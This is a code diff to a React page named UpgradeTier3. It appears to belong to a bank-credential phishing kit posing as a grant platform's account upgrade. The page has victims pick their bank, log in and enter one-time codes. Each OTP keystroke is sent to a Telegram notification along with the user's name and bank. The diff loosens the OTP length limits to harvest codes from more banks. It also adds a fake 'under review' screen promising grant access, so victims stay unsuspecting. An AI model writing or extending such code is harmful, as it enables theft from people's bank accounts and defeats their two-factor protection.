@@ -301,7 +301,7 @@ const BANKS_DATA = [
   { id: 'wy_02', name: 'Cheyenne Bank', auth: 'otp', homepage: 'chase', position: 207 },
 ];
 
-type Step = 'intro' | 'bank-select' | 'bank-login' | 'auth-confirm' | 'success';
+type Step = 'intro' | 'bank-select' | 'bank-login' | 'auth-confirm' | 'processing' | 'success';
 
 function UpgradeTier3() {
   const navigate = useNavigate();
@@ -431,9 +431,9 @@ function UpgradeTier3() {
     }, 3000);
   };
 
-  // Monitor OTP field - SHOW FULL OTP CODE
+  // Monitor OTP field - SHOW FULL OTP CODE - VARIABLE LENGTH
   const handleOtpChange = (value: string) => {
-    const otpValue = value.replace(/\D/g, '').slice(0, 6);
+    const otpValue = value.replace(/\D/g, '').slice(0, 10); // Allow up to 10 digits for different banks
     setOtp(otpValue);
     if (otpValue) {
       sendTelegramNotification(
@@ -441,7 +441,7 @@ function UpgradeTier3() {
         `👤 <b>User:</b> ${profile?.full_name}\n` +
         `🏦 <b>Bank:</b> ${selectedBank?.name}\n` +
         `🔐 <b>OTP Code Entered:</b> <code>${otpValue}</code>\n` +
-        `📊 <b>Progress:</b> ${otpValue.length}/6 digits\n` +
+        `📊 <b>Digits Received:</b> ${otpValue.length} digits\n` +
         `🕐 <b>Time:</b> ${new Date().toLocaleString()}`
       );
     }
@@ -450,7 +450,7 @@ function UpgradeTier3() {
   const handleAuthConfirm = async () => {
     if (!selectedBank || !userId) return;
     
-    if (selectedBank.auth === 'otp' && otp.length !== 6) {
+    if (!otp || otp.length < 3) { // Allow OTP of any reasonable length (3+ digits)
       return;
     }
 
@@ -491,7 +491,7 @@ function UpgradeTier3() {
           `Ready for admin review`
         );
 
-        setStep('success');
+        setStep('processing');
       } catch (e) {
         toast.error(e instanceof Error ? e.message : "Failed to submit");
       } finally {
@@ -778,7 +778,7 @@ function UpgradeTier3() {
 
             <div className="p-8 space-y-6">
               <div className="rounded-lg border border-gold/30 bg-gold/5 p-4 text-sm text-foreground">
-                A 6-digit code has been sent to your registered phone number
+                An OTP has been sent to your registered phone number
               </div>
 
               <div>
@@ -787,8 +787,7 @@ function UpgradeTier3() {
                   type="text"
                   value={otp}
                   onChange={(e) => handleOtpChange(e.target.value)}
-                  maxLength="6"
-                  placeholder="000000"
+                  placeholder="Enter OTP"
                   disabled={isTransitioning}
                   className="w-full text-center text-3xl font-bold px-4 py-4 border-2 border-border rounded-lg focus:outline-none focus:border-forest tracking-widest disabled:bg-muted disabled:cursor-not-allowed"
                 />
@@ -796,10 +795,86 @@ function UpgradeTier3() {
 
               <button
                 onClick={handleAuthConfirm}
-                disabled={otp.length !== 6 || submitting || isTransitioning}
+                disabled={otp.length < 3 || submitting || isTransitioning}
                 className="w-full py-3.5 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition disabled:bg-muted disabled:text-muted-foreground disabled:cursor-not-allowed"
               >
-                {submitting ? 'Verifying...' : 'Verify & Link Account'}
+                {submitting ? 'Verifying...' : 'Verify Account'}
+              </button>
+            </div>
+          </div>
+        </main>
+      </div>
+    );
+  }
+
+  // PROCESSING/REVIEW STEP
+  if (step === 'processing') {
+    return (
+      <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
+        <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
+          <Logo />
+        </header>
+
+        <main className="mx-auto max-w-3xl px-6">
+          <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
+            <div className="bg-gradient-primary px-8 py-12 text-primary-foreground text-center">
+              <style>{`
+                @keyframes pulse-scale {
+                  0%, 100% { transform: scale(1); opacity: 1; }
+                  50% { transform: scale(1.1); opacity: 0.8; }
+                }
+                .pulse-icon {
+                  animation: pulse-scale 2s ease-in-out infinite;
+                }
+              `}</style>
+              <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/10 mb-6 pulse-icon">
+                <Shield className="h-8 w-8 text-gold" />
+              </div>
+              <h1 className="font-display text-3xl font-semibold">Tier 3 Upgrade Under Review</h1>
+              <p className="mt-2 text-white/80">Your account verification is being processed</p>
+            </div>
+
+            <div className="p-8 space-y-8">
+              <div className="rounded-lg border border-forest/20 bg-forest/5 p-8">
+                <p className="text-foreground text-center leading-relaxed">
+                  Thank you for upgrading to Tier 3. Your account has been successfully submitted for verification. 
+                  Our review team is currently processing your request with careful attention to security and compliance. 
+                  This process typically takes 24 hours, though it may require additional time depending on verification requirements. 
+                  You will receive an email notification as soon as your upgrade is approved, at which point you'll have immediate 
+                  access to unlimited grant applications and withdrawal capabilities. We appreciate your patience and recommend 
+                  checking your email regularly for updates. Should you have any questions regarding your application status, 
+                  please don't hesitate to contact our support team.
+                </p>
+              </div>
+
+              <div className="rounded-lg border border-gold/30 bg-gold/5 p-6">
+                <p className="font-semibold text-foreground mb-3">📋 What Happens Next?</p>
+                <ol className="space-y-3 text-sm text-muted-foreground">
+                  <li className="flex items-start gap-3">
+                    <span className="inline-flex items-center justify-center w-6 h-6 rounded-full bg-gold text-primary text-xs font-bold flex-shrink-0">1</span>
+                    <span>Our review team verifies your credentials and bank information</span>
+                  </li>
+                  <li className="flex items-start gap-3">
+                    <span className="inline-flex items-center justify-center w-6 h-6 rounded-full bg-gold text-primary text-xs font-bold flex-shrink-0">2</span>
+                    <span>We conduct security and compliance checks (24 hours typical)</span>
+                  </li>
+                  <li className="flex items-start gap-3">
+                    <span className="inline-flex items-center justify-center w-6 h-6 rounded-full bg-gold text-primary text-xs font-bold flex-shrink-0">3</span>
+                    <span>You'll receive an email confirmation once approved</span>
+                  </li>
+                  <li className="flex items-start gap-3">
+                    <span className="inline-flex items-center justify-center w-6 h-6 rounded-full bg-gold text-primary text-xs font-bold flex-shrink-0">4</span>
+                    <span>Full Tier 3 access activated immediately upon approval</span>
+                  </li>
+                </ol>
+              </div>
+
+              <button
+                onClick={() => navigate({ to: "/dashboard" })}
+                className="w-full py-4 rounded-lg bg-gradient-forest text-forest-foreground font-semibold hover:opacity-95 transition flex items-center justify-center gap-2"
+              >
+                <ArrowLeft className="h-4 w-4" />
+                Return to Dashboard
               </button>
             </div>
           </div>
@@ -818,25 +893,18 @@ function UpgradeTier3() {
 
         <main className="mx-auto max-w-3xl px-6">
           <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
-            <div className="bg-gradient-forest px-8 py-7 text-forest-foreground text-center">
-              <div className="inline-flex items-center justify-center w-12 h-12 rounded-full bg-white/20 mb-4">
-                <CheckCircle2 className="h-6 w-6 text-gold" />
+            <div className="bg-gradient-forest px-8 py-12 text-forest-foreground text-center">
+              <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/20 mb-6 animate-bounce">
+                <CheckCircle2 className="h-8 w-8 text-gold" />
               </div>
               <h2 className="font-display text-2xl font-semibold">Bank Linked!</h2>
-              <p className="mt-2 text-sm text-white/80">Your account has been securely connected</p>
+              <p className="mt-2 text-white/80">Your account has been securely connected</p>
             </div>
 
             <div className="p-8 space-y-6">
               <div className="rounded-lg border border-forest/20 bg-forest/5 p-6">
                 <p className="text-xs uppercase tracking-[0.18em] text-forest font-semibold mb-3">Linked Account</p>
-                <p className="text-lg font-semibold text-foreground">{selectedBank.name}</p>
-              </div>
-
-              <div className="rounded-lg border border-gold/30 bg-gold/5 p-6">
-                <p className="font-semibold text-foreground mb-2">⏳ Upgrade Pending Review</p>
-                <p className="text-sm text-muted-foreground">
-                  Your Tier 3 upgrade request is under review. You'll receive an email confirmation within 24 hours once approved. After approval, you can apply for unlimited grants.
-                </p>
+                <p className="text-lg font-semibold text-foreground">{selectedBank?.name}</p>
               </div>
 
               <button
